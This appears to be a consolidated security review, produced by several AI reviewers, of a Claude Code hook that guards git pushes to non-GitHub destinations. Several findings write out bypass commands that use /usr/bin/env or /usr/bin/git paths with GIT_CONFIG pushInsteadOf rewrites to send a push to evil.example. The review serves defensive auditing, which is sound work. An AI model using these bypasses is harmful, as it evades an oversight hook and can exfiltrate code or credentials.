=== CONSENSUS TASK GAPS ===
- requirement: "Resolve every effective push URL with Git under the command's inline configuration and environment overrides; deny non-GitHub destinations before allowing the push."
  expected_change_site: `.claude/hooks/pr_merge_status_guard.py` env-detection branches in `git_subcommands` and `_guarded_git_invocations` (lines 770 and 438), and the env-option skip loop at line 451.

  flagged_by: [z-ai_glm-5_2]
  EVIDENCE: No diff hunk makes the env detection recognize `/usr/bin/env`, and no hunk makes the skip loop stop at `/usr/bin/git`. The test suite adds no case for `/usr/bin/env -i /usr/bin/git push` or `env -u X GIT_CONFIG_COUNT=1 ... /usr/bin/git push` without `-S`. The two bypass vectors above are unguarded, so the central security deliverable of the issue is only partially met.

=== FINDINGS FROM deepseek_deepseek-v4-pro ===
- .claude/hooks/pr_merge_status_guard.py:770 (`tokens[index] == "env"`) | severity=critical | confidence=5
  PROBLEM: `git_subcommands` matches only the bare `"env"` executable, not `/usr/bin/env`. The command `/usr/bin/env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://evil.example/.pushInsteadOf GIT_CONFIG_VALUE_0=https://github.com/o/ git push origin HEAD:x` bypasses subcommand detection.
  WHY: `guarded_git_subcommands` is empty, so `_evaluate_bash` returns `(0, "")` at line 1595 without inspecting the effective push URL, allowing the push and any credential-bearing URL to reach the attacker's destination without a block or confirmation prompt.
- .claude/hooks/pr_merge_status_guard.py:451 (`tokens[index] != "git"`) | severity=critical | confidence=5
  PROBLEM: The env-option skip loop in `_guarded_git_invocations` matches only the bare token `"git"`, so it skips `/usr/bin/git` and consumes all remaining shell tokens.
  WHY: `_guarded_git_invocations` returns an empty list, so `_evaluate_bash` returns `(0, "")` without checking the destination, even when a `-c url.*.pushInsteadOf=` rewrite sends the push to a non-GitHub destination.
- .claude/hooks/pr_merge_status_guard.py:438 (`tokens[index] == "env"`) | severity=high | confidence=5
  PROBLEM: The env-wrapper entry in `_guarded_git_invocations` matches only `"env"`, not `/usr/bin/env`.
  WHY: Even if `git_subcommands` detects `/usr/bin/env`, `_guarded_git_invocations` produces zero invocations, leaving the push unguarded.
- .claude/hooks/pr_merge_status_guard.py:831 (`"$" in split_value or "`" in split_value`) | severity=low | confidence=5
  PROBLEM: `_env_split_string_has_guarded_git` triggers confirmation for any `env -S` argument containing `$` or backtick, even when the split string produces a non-Git command.
  WHY: The expansion check runs before the `git_subcommands` call on line 832, causing unnecessary permission prompts for safe commands.

=== END FINDINGS FROM deepseek_deepseek-v4-pro ===

=== FINDINGS FROM minimax_minimax-m3 ===
- .claude/hooks/pr_merge_status_guard.py:438, 770; workflow-templates/.claude/hooks/pr_merge_status_guard.py:438, 770 | confidence=5
  PROBLEM: The new `env`-wrapper handling recognizes only the bare executable name `env`, not `/usr/bin/env`. Anywhere in a Bash command that invokes git through a fully-qualified `env` path, the parser walks past `/usr/bin/env` without entering the env-handling branch, so the `_GIT_CONFIG_COUNT` / `_KEY_*` / `_VALUE_*` assignments that follow are processed as ordinary shell prefix assignments and the trailing `/usr/bin/git push …` is then dropped by the same line's `tokens[index] != "git" and not tokens[index].endswith("/git")` filter.
  WHY: `_guarded_git_invocations` returns no invocations for the entire command, so `_evaluate_bash` exits with `(0, "")` and the configured `url.*.pushInsteadOf` rewrite takes the push and any embedded credentials to the attacker's destination.
- .claude/hooks/pr_merge_status_guard.py:451; workflow-templates/.claude/hooks/pr_merge_status_guard.py:451 | confidence=5
  PROBLEM: The skip loop that walks past `env` options to find the eventual git executable compares against the literal token `"git"`. Any git binary whose name carries a directory prefix — `/usr/bin/git`, `/usr/local/bin/git`, `/snap/bin/git` — is never recognized by this loop, so the env-options branch consumes every remaining token in the segment.
  WHY: `env -i /usr/bin/git push origin HEAD:feature/x` is not guarded; a `url.*.pushInsteadOf` rewrite can send the push and its inline `GIT_CONFIG_*`/credentials to the rewritten destination.
- .claude/hooks/pr_merge_status_guard.py:829-834; workflow-templates/.claude/hooks/pr_merge_status_guard.py:829-834 | confidence=5
  PROBLEM: The `"$"`/backtick short-circuit fires before the git-subcommand and recursive checks, so a safe shell command such as `env -S 'printf "$HOME"'` is treated as requiring confirmation.
  WHY: `_evaluate_bash` routes the result to `_request_confirmation("env --split-string may execute git commit/push with an unknown destination")`, prompting the user for an unrelated `printf` call.

=== END FINDINGS FROM minimax_minimax-m3 ===

=== FINDINGS FROM openai_gpt-6-luna ===
- .claude/hooks/pr_merge_status_guard.py and workflow-templates/.claude/hooks/pr_merge_status_guard.py: `git_subcommands()` lines 770-789; `_guarded_git_invocations()` lines 438-453; `_evaluate_bash()` lines 1595-1596 | severity=high | confidence=5
  PROBLEM: Both parsers recognize only the bare `env` executable, not `/usr/bin/env`. A command invoking `/usr/bin/env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://evil.example/.pushInsteadOf GIT_CONFIG_VALUE_0=https://github.com/o/ /usr/bin/git push origin HEAD:feature/x` is not classified as a guarded Git command.
  WHY: `git_subcommands()` returns no guarded subcommand, so `_evaluate_bash()` exits before resolving the effective push URL or requesting confirmation. The push can therefore reach the rewritten non-GitHub destination.
- .claude/hooks/pr_merge_status_guard.py and workflow-templates/.claude/hooks/pr_merge_status_guard.py: `_guarded_git_invocations()` lines 449-453 | severity=high | confidence=5
  PROBLEM: After recognizing bare `env`, the option-skip loop searches for the exact token `git`. For `env -i /usr/bin/git push origin HEAD:feature/x`, it skips past `/usr/bin/git` and returns no invocation.
  WHY: `git_subcommands()` recognizes the push because `/usr/bin/git` ends in `/git`, but `_guarded_git_invocations()` produces no target to check. `_evaluate_bash()` then reaches its normal allow return without checking the destination or requesting confirmation.
- .claude/hooks/pr_merge_status_guard.py and workflow-templates/.claude/hooks/pr_merge_status_guard.py: `_env_split_string_has_guarded_git()` line 831 | severity=low | confidence=5
  PROBLEM: Any `$` or backtick in an `env -S` argument triggers confirmation before the code determines whether the split command invokes guarded Git.
  WHY: A safe command such as `env -S 'printf "$HOME"'` requests confirmation even though the split command does not invoke Git.

=== END FINDINGS FROM openai_gpt-6-luna ===
